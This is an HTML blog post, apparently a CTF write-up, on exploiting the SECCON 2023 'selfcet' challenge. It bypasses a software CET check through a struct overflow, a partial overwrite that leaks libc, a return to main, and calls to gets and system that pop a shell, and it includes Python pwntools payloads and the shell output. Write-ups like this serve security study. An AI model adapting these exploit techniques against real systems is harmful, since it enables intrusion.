@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SECCON CTF 2023 Quals - selfcet | kileak</title>
+
+
+
+
+
+<meta name="description" content="SECCON CTF 2023 Quals - selfcet">
+
+
+<meta name="keywords" content="seccon, selfcet">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/secconquals23-selfcet/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SECCON CTF 2023 Quals - selfcet</h1>
+      <p class="post-meta">Sep 17, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>SECCON CTF 2023 Quals - selfcet
+<!--break--></p>
+
+  <p>I wrote Software CET because Intel CET is not yet widely available.</p>
+
+  <p>nc selfcet.seccon.games 9999</p>
+
+  <p>Team: HK Guesser</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/seccon23/selfcet/selfcet.tar.gz">selfcet.tar.gz</a> 
+<a href="https://kileak.github.io/assets/seccon23/selfcet/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="n">KEY_SIZE</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">KEY_SIZE</span><span class="p">];</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">throw</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span> <span class="p">...);</span>
+<span class="p">}</span> <span class="n">ctx_t</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">read_member</span><span class="p">(</span><span class="n">ctx_t</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">ctx</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+    <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">error</span> <span class="o">=</span> <span class="s">"I/O Error"</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">CFI</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">throw</span><span class="p">)(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">status</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+<span class="n">read_member</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ctx_t</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
+<span class="n">read_member</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">ctx_t</span><span class="p">,</span> <span class="n">buf</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">selfcet</code> let you read into <code class="language-plaintext highlighter-rouge">key</code> and <code class="language-plaintext highlighter-rouge">buf</code> of the <code class="language-plaintext highlighter-rouge">ctx</code> object. Since the size for the <code class="language-plaintext highlighter-rouge">read</code> was <code class="language-plaintext highlighter-rouge">sizeof(ctx)</code>, we’re able to also overwrite the data behind it.</p>
+
+<p>The first read let’s you overwrite everything in the <code class="language-plaintext highlighter-rouge">ctx</code> object (since <code class="language-plaintext highlighter-rouge">offset</code> is <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">size</code> is <code class="language-plaintext highlighter-rouge">sizeof(ctx)</code>), while the second one also lets you overwrite data behind the <code class="language-plaintext highlighter-rouge">ctx</code> object (since <code class="language-plaintext highlighter-rouge">offset</code> points to <code class="language-plaintext highlighter-rouge">buf</code> object, while <code class="language-plaintext highlighter-rouge">size</code> is still <code class="language-plaintext highlighter-rouge">sizeof(ctx)</code>).</p>
+
+<p>If we’d been able to leak or control the <code class="language-plaintext highlighter-rouge">canary</code>, that could have been used to do a rop chain after the second <code class="language-plaintext highlighter-rouge">read_member</code>.</p>
+
+<p>Didn’t find a way to leak the canary, so I went on with a small bruteforce approach (1 nibble had to be bruteforced for this in the first read).</p>
+
+<p>When we overwrite <code class="language-plaintext highlighter-rouge">status</code> in <code class="language-plaintext highlighter-rouge">read_member</code>, it will call</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">CFI</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">throw</span><span class="p">)(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">status</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">error</span><span class="p">);</span></code></pre></figure>
+
+<p>Initially <code class="language-plaintext highlighter-rouge">ctx-&gt;throw</code> will point to <code class="language-plaintext highlighter-rouge">err</code> in <code class="language-plaintext highlighter-rouge">libc</code>, so this would call <code class="language-plaintext highlighter-rouge">err(ctx-&gt;status, ctx-&gt;error)</code>, but will pass the function first to the <code class="language-plaintext highlighter-rouge">CFI</code> macro.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define INSN_ENDBR64 (0xF30F1EFA) </span><span class="cm">/* endbr64 */</span><span class="cp">
+#define CFI(f)                                              \
+  ({                                                        \
+    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
+      __builtin_trap();                                     \
+    (f);                                                    \
+  })</span></code></pre></figure>
+
+<p>This will basically just check, that the function, that is called here, begins with an <code class="language-plaintext highlighter-rouge">endbr64</code>, so we cannot use arbitrary rop gadgets here, but have to call matching functions.</p>
+
+<p>To get a leak, I checked which functions are near <code class="language-plaintext highlighter-rouge">err</code>, so that we could call them with a partial overwrite.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(these are local offsets from my debug libc, the exploit uses the correct ones from remote libc)
+
+0x7ffff7eae010 &lt;__GI_warn&gt;:	endbr64 
+0x7ffff7eae014 &lt;__GI_warn+4&gt;:	sub    rsp,0xd8
+0x7ffff7eae01b &lt;__GI_warn+11&gt;:	mov    QWORD PTR [rsp+0x28],rsi
+0x7ffff7eae020 &lt;__GI_warn+16&gt;:	mov    QWORD PTR [rsp+0x30],rdx
+
+...
+
+0x7ffff7eae1d0 &lt;err&gt;:	endbr64 
+0x7ffff7eae1d4 &lt;err+4&gt;:	push   rax
+0x7ffff7eae1d5 &lt;err+5&gt;:	pop    rax
+0x7ffff7eae1d6 &lt;err+6&gt;:	sub    rsp,0xd8
+0x7ffff7eae1dd &lt;err+13&gt;:	mov    QWORD PTR [rsp+0x30],rdx
+0x7ffff7eae1e2 &lt;err+18&gt;:	mov    QWORD PTR [rsp+0x38],rcx</code></pre></figure>
+
+<p>So, doing a partial overwrite, only overwriting the last 2 bytes of <code class="language-plaintext highlighter-rouge">ctx-&gt;throw</code> would allow us to call <code class="language-plaintext highlighter-rouge">warn</code> instead of <code class="language-plaintext highlighter-rouge">err</code>, which will also do output but not <code class="language-plaintext highlighter-rouge">exit</code> after printing the data.</p>
+
+<p>So, our first payload looks like this</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">payload1</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mh">0x20</span>              <span class="c1"># key
+</span>    <span class="n">payload1</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span>                <span class="c1"># buf
+</span>    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404000</span><span class="p">)</span>           <span class="c1"># error
+</span>    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"read"</span><span class="p">])</span>      <span class="c1"># status
+</span>    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40d0</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>         <span class="c1"># throw
+</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"xor: "</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"read"</span><span class="p">]</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>When the partial overwrite succeeds, this will call <code class="language-plaintext highlighter-rouge">warn(e.got["read], 0x404000)</code>, which will just print a warning containing a leak to <code class="language-plaintext highlighter-rouge">read.got</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] LEAK        : 0x7ffff7ea7980
+[*] LIBC        : 0x7ffff7d93000</code></pre></figure>
+
+<p>With this leak, we can now call everything from <code class="language-plaintext highlighter-rouge">libc</code> in the second payload (and even overwrite the canary and put a rop chain behind the <code class="language-plaintext highlighter-rouge">ctx</code> object). At that point, I already thought that we’d need to find a way to leak the <code class="language-plaintext highlighter-rouge">canary</code> and do a ropchain, to get around the <code class="language-plaintext highlighter-rouge">endbr64</code> restriction, but didn’t find anything useful for that.</p>
+
+<p>One of the main issues, that we couldn’t do something useful with the remaining payload was, that <code class="language-plaintext highlighter-rouge">status</code> was an <code class="language-plaintext highlighter-rouge">int32</code>, meaning we wouldn’t be able to pass a 64-bit address as first argument (which would be needed, if we would want to call something like <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, while using <code class="language-plaintext highlighter-rouge">/bin/sh</code> from libc). Also going for <code class="language-plaintext highlighter-rouge">execveat</code> wasn’t helpful, since we didn’t control <code class="language-plaintext highlighter-rouge">rdx</code> (properly).</p>
+
+<p>If we’d just have one additional call to read <code class="language-plaintext highlighter-rouge">/bin/sh</code> to <code class="language-plaintext highlighter-rouge">bss</code> (which would be accessable via a 32 bit address) before calling <code class="language-plaintext highlighter-rouge">system</code>, this would be easy.</p>
+
+<p>So, let’s just use the second payload to jump back into main!</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload1</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>             <span class="c1"># buf
+</span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401209</span><span class="p">)</span>       <span class="c1"># error
+</span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>            <span class="c1"># status
+</span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">])</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span></code></pre></figure>
+
+<p>This will now call <code class="language-plaintext highlighter-rouge">__libc_start_main(main)</code>, which will just jump back into <code class="language-plaintext highlighter-rouge">main</code>, giving us the possibility to do 2 payloads again.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># back in main at first payload
+</span><span class="n">payload1</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404500</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404500</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"gets"</span><span class="p">])</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span></code></pre></figure>
+
+<p>This will call <code class="language-plaintext highlighter-rouge">gets(0x404500)</code> and the next send will write <code class="language-plaintext highlighter-rouge">/bin/sh</code> to <code class="language-plaintext highlighter-rouge">0x405000</code>. Since we now have our path at an address, that can be referenced via a 32-bit address, we can now just call <code class="language-plaintext highlighter-rouge">system(0x404500)</code> with the second payload.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload1</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401209</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404500</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span></code></pre></figure>
+
+<p>which will now trigger a shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] LEAK        : 0x7f2c75f47980
+[*] LIBC        : 0x7f2c75e33000
+[*] Paused (press any to continue)
+[*] Paused (press any to continue)
+[*] Paused (press any to continue)
+[*] calling main
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+
+$ cat flag-eb7297012865f6eede53f56158c52e85.txt
+SECCON{b7w_CET_1s_3n4bL3d_by_arch_prctl}</code></pre></figure>
+
+<p>As the flag hints, the intended solution was using <code class="language-plaintext highlighter-rouge">prctl</code>, but well :)</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SECCON CTF 2023 Quals - selfcet&amp;url=https://kileak.github.io/ctf/2023/secconquals23-selfcet/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/secconquals23-selfcet/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/secconquals23-selfcet';
+        var disqus_title = 'SECCON CTF 2023 Quals - selfcet';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/secconquals23-selfcet';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
